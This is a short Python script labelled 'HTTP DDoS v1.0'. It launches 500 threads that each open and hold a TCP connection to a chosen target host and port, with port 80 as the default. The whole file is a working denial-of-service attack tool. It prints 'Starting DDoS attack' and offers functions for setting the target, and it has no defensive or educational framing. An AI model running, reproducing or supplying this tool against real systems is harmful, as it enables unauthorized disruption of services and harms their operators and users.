__author__ = 'Liew Jun Tung'

#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import socket
import time
from threading import Thread

print('HTTP DDoS v1.0\n')
threads = 500
t = 20
host = "0.0.0.0"
port = 0

def setTarget(host1, time1, port1):
    global host, port,t
    host = host1
    port = int(port1)
    t = int(time1)
    attack()

def setTarget1(host1, time1):
    global host, port, t
    host = host1
    port = 80
    t = int(time1)
    attack()

def setTarget2(host1):
    global host, port, t
    host = host1
    port = 80
    t = 20
    attack()

def connect(i):
        try:
                print('Thread #%d: Attacking...' % i)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host,port))
                time.sleep(t)
                sock.close()
        except:
                print('Cannot connect to %s...' % host)
def attack():
        print('\nStarting DDoS attack...\n')
        for i in range(threads):
                t = Thread(target=connect, args=(i,))
                t.start()

